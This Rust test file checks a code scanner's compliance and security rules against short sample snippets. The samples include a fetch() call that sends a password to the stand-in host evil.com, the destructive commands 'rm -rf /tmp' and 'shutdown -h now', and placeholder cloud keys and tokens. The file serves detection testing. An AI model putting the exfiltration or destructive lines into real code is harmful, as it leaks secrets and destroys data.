//! Enterprise Rules Tests
//!
//! Comprehensive tests for all 29 enterprise rules.

#[cfg(test)]
mod tests {
    use crate::scanner::enterprise::*;
    use crate::scanner::LnAst;

    // ─── Helper ────────────────────────────────────────────────────────────────

    fn rule_finds<F>(make_rules: F, code: &str) -> Vec<String>
    where
        F: Fn() -> Vec<Box<dyn crate::scanner::base::LangRule>>,
    {
        let rules = make_rules();
        let mut ids = vec![];
        for rule in rules {
            for f in rule.detect(&LnAst::empty("test"), code) {
                ids.push(f.rule_id);
            }
        }
        ids
    }

    // ─── GDPR / PII Rules ─────────────────────────────────────────────────────

    #[test]
    fn test_gdpr_001_hardcoded_email() {
        let code = r#"const api_key = "user@example.com";"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"GDPR-001".to_string()), "Should detect email: {ids:?}");
    }

    #[test]
    fn test_gdpr_001_hardcoded_ssn() {
        let code = r#"ssn = "123-45-6789";"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"GDPR-001".to_string()), "Should detect SSN: {ids:?}");
    }

    #[test]
    fn test_gdpr_001_hardcoded_phone() {
        let code = r#"phone = "555-123-4567";"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"GDPR-001".to_string()), "Should detect phone: {ids:?}");
    }

    #[test]
    fn test_gdpr_002_logging_pii() {
        let code = r#"console.log("User email:", user.email);"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"GDPR-002".to_string()), "Should detect PII in logs: {ids:?}");
    }

    #[test]
    fn test_gdpr_003_missing_retention() {
        let code = r#"CREATE TABLE users (id INT);"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"GDPR-003".to_string()), "Should detect missing retention: {ids:?}");
    }

    #[test]
    fn test_pci_001_unencrypted_card_data() {
        let code = r#"card_number = request.form['card'];"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"PCI-001".to_string()), "Should detect unencrypted card data: {ids:?}");
    }

    #[test]
    fn test_pci_002_hardcoded_pan() {
        let code = r#"const card = "4111111111111111";"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"PCI-002".to_string()), "Should detect hardcoded PAN: {ids:?}");
    }

    #[test]
    fn test_pci_003_prohibited_data_cvv() {
        let code = r#"cvv = user_input;"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"PCI-003".to_string()), "Should detect CVV storage: {ids:?}");
    }

    #[test]
    fn test_pci_003_prohibited_data_pin() {
        let code = r#"pin = "1234";"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"PCI-003".to_string()), "Should detect PIN storage: {ids:?}");
    }

    #[test]
    fn test_pci_004_missing_encryption_annotation() {
        let code = r#"@Column(name = "address") private String address;"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"PCI-004".to_string()), "Should detect missing encryption: {ids:?}");
    }

    #[test]
    fn test_pci_005_cardholder_data_not_documented() {
        let code = r#"function processPayment(cardData) { }"#;
        let ids = rule_finds(|| gdpr_pii_rules(), code);
        assert!(ids.contains(&"PCI-005".to_string()), "Should detect undocumented card data flow: {ids:?}");
    }

    // ─── Audit Trail Rules ───────────────────────────────────────────────────

    #[test]
    fn test_audit_001_missing_audit_delete() {
        let code = r#"DELETE FROM users WHERE id = 1;"#;
        let ids = rule_finds(|| audit_trail_rules(), code);
        assert!(ids.contains(&"AUDIT-001".to_string()), "Should detect DELETE without audit: {ids:?}");
    }

    #[test]
    fn test_audit_001_missing_audit_drop() {
        let code = r#"DROP TABLE orders;"#;
        let ids = rule_finds(|| audit_trail_rules(), code);
        assert!(ids.contains(&"AUDIT-001".to_string()), "Should detect DROP without audit: {ids:?}");
    }

    #[test]
    fn test_audit_002_log_without_context() {
        let code = r#"console.log("User logged in");"#;
        let ids = rule_finds(|| audit_trail_rules(), code);
        assert!(ids.contains(&"AUDIT-002".to_string()), "Should detect log without user/timestamp: {ids:?}");
    }

    #[test]
    fn test_audit_003_exec_without_logging() {
        let code = r#"exec("rm -rf /tmp");"#;
        let ids = rule_finds(|| audit_trail_rules(), code);
        assert!(ids.contains(&"AUDIT-003".to_string()), "Should detect exec without logging: {ids:?}");
    }

    #[test]
    fn test_audit_003_system_without_logging() {
        let code = r#"system("shutdown -h now");"#;
        let ids = rule_finds(|| audit_trail_rules(), code);
        assert!(ids.contains(&"AUDIT-003".to_string()), "Should detect system call without logging: {ids:?}");
    }

    // ─── OAuth / SSO Rules ────────────────────────────────────────────────────

    #[test]
    fn test_sso_001_hardcoded_client_secret() {
        let code = r#"client_secret = "my-secret-key-123";"#;
        let ids = rule_finds(|| oauth_sso_rules(), code);
        assert!(ids.contains(&"SSO-001".to_string()), "Should detect hardcoded SSO config: {ids:?}");
    }

    #[test]
    fn test_sso_002_skip_saml_validation() {
        let code = r#"config.skipSignatureValidation = true;"#;
        let ids = rule_finds(|| oauth_sso_rules(), code);
        assert!(ids.contains(&"SSO-002".to_string()), "Should detect disabled SAML validation: {ids:?}");
    }

    #[test]
    fn test_sso_003_infinite_session() {
        let code = r#"session.maxAge = -1;"#;
        let ids = rule_finds(|| oauth_sso_rules(), code);
        assert!(ids.contains(&"SSO-003".to_string()), "Should detect infinite session: {ids:?}");
    }

    #[test]
    fn test_sso_003_expire_on_close_false() {
        let code = r#"session.expireOnClose = false;"#;
        let ids = rule_finds(|| oauth_sso_rules(), code);
        assert!(ids.contains(&"SSO-003".to_string()), "Should detect no expire on close: {ids:?}");
    }

    #[test]
    fn test_sso_004_mfa_disabled() {
        let code = r#"mfaEnabled = false;"#;
        let ids = rule_finds(|| oauth_sso_rules(), code);
        assert!(ids.contains(&"SSO-004".to_string()), "Should detect MFA disabled: {ids:?}");
    }

    #[test]
    fn test_sso_005_token_no_expiration() {
        let code = r#"jwt.sign(payload, secret, { expiresIn: null });"#;
        let ids = rule_finds(|| oauth_sso_rules(), code);
        assert!(ids.contains(&"SSO-005".to_string()), "Should detect token without expiry: {ids:?}");
    }

    // ─── Rate Limiting Rules ─────────────────────────────────────────────────

    #[test]
    fn test_rate_001_endpoint_without_rate_limit() {
        let code = r#"app.get("/api/users", (req, res) => { });"#;
        let ids = rule_finds(|| rate_limit_rules(), code);
        assert!(ids.contains(&"RATE-001".to_string()), "Should detect route without rate limit: {ids:?}");
    }

    #[test]
    fn test_rate_002_quota_not_enforced() {
        let code = r#"const quota = 1000;"#;
        let ids = rule_finds(|| rate_limit_rules(), code);
        assert!(ids.contains(&"RATE-002".to_string()), "Should detect quota without enforcement: {ids:?}");
    }

    #[test]
    fn test_rate_003_upload_without_size_limit() {
        let code = r#"multer({ dest: "/uploads" });"#;
        let ids = rule_finds(|| rate_limit_rules(), code);
        assert!(ids.contains(&"RATE-003".to_string()), "Should detect upload without size limit: {ids:?}");
    }

    #[test]
    fn test_rate_004_unlimited_semaphore() {
        let code = r#"new Semaphore(0);"#;
        let ids = rule_finds(|| rate_limit_rules(), code);
        assert!(ids.contains(&"RATE-004".to_string()), "Should detect unlimited semaphore: {ids:?}");
    }

    // ─── Multi-Tenant Isolation Rules ────────────────────────────────────────

    #[test]
    fn test_saas_001_tenant_data_leak() {
        let code = r#"SELECT * FROM orders"#;
        let ids = rule_finds(|| tenant_isolation_rules(), code);
        assert!(ids.contains(&"SAAS-001".to_string()), "Should detect query without tenant filter: {ids:?}");
    }

    #[test]
    fn test_saas_002_orm_without_tenant_scope() {
        let code = r#"User.find({ where: { id: userId } });"#;
        let ids = rule_finds(|| tenant_isolation_rules(), code);
        assert!(ids.contains(&"SAAS-002".to_string()), "Should detect ORM query without tenant scope: {ids:?}");
    }

    #[test]
    fn test_saas_003_cache_without_tenant_prefix() {
        let code = r#"cache.set("user_profile", data);"#;
        let ids = rule_finds(|| tenant_isolation_rules(), code);
        assert!(ids.contains(&"SAAS-003".to_string()), "Should detect cache without tenant prefix: {ids:?}");
    }

    #[test]
    fn test_saas_004_upload_without_tenant_check() {
        let code = r#"s3.upload({ Bucket: "my-bucket", Key: fileName });"#;
        let ids = rule_finds(|| tenant_isolation_rules(), code);
        assert!(ids.contains(&"SAAS-004".to_string()), "Should detect upload without tenant check: {ids:?}");
    }

    #[test]
    fn test_saas_005_admin_api_key_default() {
        let code = r#"createApiKey({ role: "admin" });"#;
        let ids = rule_finds(|| tenant_isolation_rules(), code);
        assert!(ids.contains(&"SAAS-005".to_string()), "Should detect admin by default: {ids:?}");
    }

    // ─── DLP Rules ───────────────────────────────────────────────────────────

    #[test]
    fn test_dlp_001_sensitive_data_external() {
        let code = r#"fetch("https://evil.com", { body: JSON.stringify({ password }) });"#;
        let ids = rule_finds(|| data_exfil_rules(), code);
        assert!(ids.contains(&"DLP-001".to_string()), "Should detect sensitive data to external: {ids:?}");
    }

    #[test]
    fn test_dlp_002_db_creds_exfil() {
        let code = r#"console.log("conn:", connection_string);"#;
        let ids = rule_finds(|| data_exfil_rules(), code);
        assert!(ids.contains(&"DLP-002".to_string()), "Should detect DB creds exfil: {ids:?}");
    }

    #[test]
    fn test_dlp_003_aws_hardcoded_creds() {
        let code = r#"aws_access_key_id = "AKIAIOSFODNN7EXAMPLE";"#;
        let ids = rule_finds(|| data_exfil_rules(), code);
        assert!(ids.contains(&"DLP-003".to_string()), "Should detect AWS credentials: {ids:?}");
    }

    #[test]
    fn test_dlp_003_azure_hardcoded_creds() {
        let code = r#"AZURE_CLIENT_SECRET = "super-secret-value";"#;
        let ids = rule_finds(|| data_exfil_rules(), code);
        assert!(ids.contains(&"DLP-003".to_string()), "Should detect Azure credentials: {ids:?}");
    }

    #[test]
    fn test_dlp_004_github_token() {
        let code = r#"const token = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";"#;
        let ids = rule_finds(|| data_exfil_rules(), code);
        assert!(ids.contains(&"DLP-004".to_string()), "Should detect GitHub token: {ids:?}");
    }

    #[test]
    fn test_dlp_004_stripe_key() {
        let code = r#"const key = "sk_live_abcdefghijklmnopqrstuvwxyz";"#;
        let ids = rule_finds(|| data_exfil_rules(), code);
        assert!(ids.contains(&"DLP-004".to_string()), "Should detect Stripe key: {ids:?}");
    }

    #[test]
    fn test_dlp_004_jwt_token() {
        let code = r#"token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";"#;
        let ids = rule_finds(|| data_exfil_rules(), code);
        assert!(ids.contains(&"DLP-004".to_string()), "Should detect JWT token: {ids:?}");
    }

    #[test]
    fn test_dlp_005_private_key() {
        let code = r#"-----BEGIN PRIVATE KEY-----"#;
        let ids = rule_finds(|| data_exfil_rules(), code);
        assert!(ids.contains(&"DLP-005".to_string()), "Should detect private key: {ids:?}");
    }

    #[test]
    fn test_dlp_005_rsa_private_key() {
        let code = r#"-----BEGIN RSA PRIVATE KEY-----"#;
        let ids = rule_finds(|| data_exfil_rules(), code);
        assert!(ids.contains(&"DLP-005".to_string()), "Should detect RSA private key: {ids:?}");
    }

    // ─── Supply Chain Lock Rules ─────────────────────────────────────────────

    #[test]
    fn test_lock_001_package_lock_without_integrity() {
        let code = r#"{
  "name": "my-project",
  "version": "1.0.0",
  "dependencies": {
    "lodash": {
      "version": "4.17.21"
    }
  }
}"#;
        let ids = rule_finds(|| supply_chain_lock_rules(), code);
        assert!(ids.contains(&"LOCK-001".to_string()), "Should detect package-lock without integrity: {ids:?}");
    }

    #[test]
    fn test_lock_002_go_sum_missing() {
        let code = r#"require (
    github.com/gin-gonic/gin v1.9.1
)"#;
        let ids = rule_finds(|| supply_chain_lock_rules(), code);
        assert!(ids.contains(&"LOCK-002".to_string()), "Should detect go.mod without go.sum: {ids:?}");
    }

    #[test]
    fn test_lock_003_yarn_lock_without_checksum() {
        let code = r#"lodash@^4.17.21:
  version "4.17.21"
  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"#;
        let ids = rule_finds(|| supply_chain_lock_rules(), code);
        assert!(ids.contains(&"LOCK-003".to_string()), "Should detect yarn.lock without checksum: {ids:?}");
    }

    #[test]
    fn test_lock_004_requirements_without_hash() {
        let code = r#"requests==2.31.0
flask==3.0.0
pytest==7.4.0"#;
        let ids = rule_finds(|| supply_chain_lock_rules(), code);
        assert!(ids.contains(&"LOCK-004".to_string()), "Should detect requirements without hash: {ids:?}");
    }

    // ─── Total Rule Count ────────────────────────────────────────────────────

    #[test]
    fn test_total_enterprise_rules_count() {
        let mut total = 0;
        total += gdpr_pii_rules().len();        // 8
        total += audit_trail_rules().len();      // 3
        total += oauth_sso_rules().len();        // 5
        total += rate_limit_rules().len();       // 4
        total += tenant_isolation_rules().len(); // 5
        total += data_exfil_rules().len();       // 5
        total += supply_chain_lock_rules().len(); // 4
        assert_eq!(total, 34);
    }

    // ─── No False Positives ─────────────────────────────────────────────────

    #[test]
    fn test_no_false_positive_clean_code() {
        let code = "import logging\nlogger = logging.getLogger(__name__)\nlogger.info(\"Application started\", extra={\"user_id\": user_id})";
        let ids: Vec<String> = rule_finds(|| gdpr_pii_rules(), code).into_iter()
            .chain(rule_finds(|| audit_trail_rules(), code))
            .chain(rule_finds(|| oauth_sso_rules(), code))
            .chain(rule_finds(|| rate_limit_rules(), code))
            .chain(rule_finds(|| tenant_isolation_rules(), code))
            .chain(rule_finds(|| data_exfil_rules(), code))
            .collect();

        // Clean code should NOT trigger GDPR-002 (has user_id context) or AUDIT-002 (has user_id)
        let has_false_positive = ids.iter().any(|id| id == "GDPR-002" || id == "AUDIT-002");
        assert!(!has_false_positive, "Clean code should not trigger GDPR-002 or AUDIT-002");
    }
}
